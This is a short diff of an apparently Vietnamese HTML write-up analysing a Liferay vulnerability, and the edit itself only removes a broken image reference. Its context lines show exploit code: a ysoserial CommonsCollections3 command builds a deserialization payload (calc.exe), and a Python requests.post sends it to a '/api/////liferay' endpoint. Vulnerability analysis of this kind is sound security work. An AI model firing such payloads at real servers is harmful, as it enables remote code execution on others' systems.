@@ -94,7 +94,7 @@ Các lệnh của được xử lý thông qua tham số <code>?doAs</code> và 
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">-jar ./ysoserial-all.jar CommonsCollections3 calc.exe &gt; payload.bin &#34;</span>)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">requests</span>.<span style="color:#a6e22e">post</span>(<span style="color:#a6e22e">url</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/api/////liferay&#34;</span>, <span style="color:#a6e22e">data</span><span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;payload.bin&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>))
-</span></span></code></pre></div><p>![Untitled](Untitled 1.png)</p>
+</span></span></code></pre></div><p></p>
 </li>
 <li>
 <p>Phân tích lỗ hổng</p>
